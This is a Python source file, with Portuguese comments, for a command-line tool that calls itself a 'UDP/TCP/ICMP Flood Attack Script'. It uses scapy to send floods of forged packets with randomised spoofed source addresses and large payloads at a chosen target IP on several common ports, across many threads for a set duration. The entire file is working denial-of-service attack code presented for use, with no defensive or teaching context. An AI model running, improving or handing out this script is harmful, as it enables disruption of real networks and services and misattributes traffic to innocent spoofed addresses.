from scapy.all import IP, UDP, TCP, ICMP, Raw, send
import random
import concurrent.futures
import time
import logging
import argparse
import sys
import threading
import signal

# Configuração do logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Flag de controle para interrupção
stop_event = threading.Event()

def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

def flood_packet(target_ip, payload, protocol, port):
    try:
        if protocol == "udp":
            packet = IP(src=generate_fake_ip(), dst=target_ip) / UDP(dport=port) / Raw(load=payload)
        elif protocol == "tcp":
            packet = IP(src=generate_fake_ip(), dst=target_ip) / TCP(dport=port) / Raw(load=payload)
        elif protocol == "icmp":
            packet = IP(src=generate_fake_ip(), dst=target_ip) / ICMP() / Raw(load=payload)
        send(packet, verbose=0)
    except Exception as e:
        logging.error(f"Erro ao enviar pacote {protocol.upper()} para a porta {port}: {e}", exc_info=True)

def start_flood(target_ip, rate_limit, payload_size, threads, duration, max_packets=None):
    end_time = time.perf_counter() + duration
    payload = b"A" * payload_size
    packet_count = {"udp": 0, "tcp": 0, "icmp": 0}
    ports = [554, 80, 443, 8080, 53]  # Portas comuns para ataque

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads * 3) as executor:
        while time.perf_counter() < end_time and not stop_event.is_set():
            if max_packets and (packet_count["udp"] + packet_count["tcp"] + packet_count["icmp"]) >= max_packets:
                logging.info(f"Limite de {max_packets} pacotes atingido.")
                break

            start_time = time.perf_counter()
            futures = []
            for port in ports:
                futures.extend([executor.submit(flood_packet, target_ip, payload, "udp", port) for _ in range(rate_limit)])
                futures.extend([executor.submit(flood_packet, target_ip, payload, "tcp", port) for _ in range(rate_limit)])
                futures.extend([executor.submit(flood_packet, target_ip, payload, "icmp", port) for _ in range(rate_limit)])

            concurrent.futures.wait(futures)

            packet_count["udp"] += rate_limit * len(ports)
            packet_count["tcp"] += rate_limit * len(ports)
            packet_count["icmp"] += rate_limit * len(ports)

            elapsed_time = time.perf_counter() - start_time
            sleep_time = max(0, 1 - elapsed_time)
            if sleep_time > 0:
                time.sleep(sleep_time)

            logging.info(f"Enviados {rate_limit * len(ports)} pacotes UDP, {rate_limit * len(ports)} pacotes TCP "
                         f"e {rate_limit * len(ports)} pacotes ICMP em {elapsed_time:.2f}s. "
                         f"Total UDP: {packet_count['udp']}, Total TCP: {packet_count['tcp']}, Total ICMP: {packet_count['icmp']}")

def signal_handler(sig, frame):
    logging.info("Interrupção detectada, finalizando ataque...")
    stop_event.set()

def main():
    parser = argparse.ArgumentParser(description="UDP/TCP/ICMP Flood Attack Script")
    parser.add_argument("target_ip", type=str, help="Endereço IP do alvo")
    parser.add_argument("--rate", type=int, default=1000, help="Pacotes por segundo (padrão: 1000)")
    parser.add_argument("--payload", type=int, default=10000, help="Tamanho do payload em bytes (padrão: 10000)")
    parser.add_argument("--threads", type=int, default=1000, help="Número de threads (padrão: 1000)")
    parser.add_argument("--duration", type=int, default=60, help="Duração do ataque em segundos (padrão: 60)")
    parser.add_argument("--max_packets", type=int, default=None, help="Número máximo de pacotes a serem enviados (opcional)")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    logging.info(f"Iniciando ataque combinado UDP/TCP/ICMP flood em {args.target_ip} por {args.duration} segundos...")
    start_flood(args.target_ip, args.rate, args.payload, args.threads, args.duration, args.max_packets)
    logging.info("Ataque finalizado.")

if __name__ == "__main__":
    main()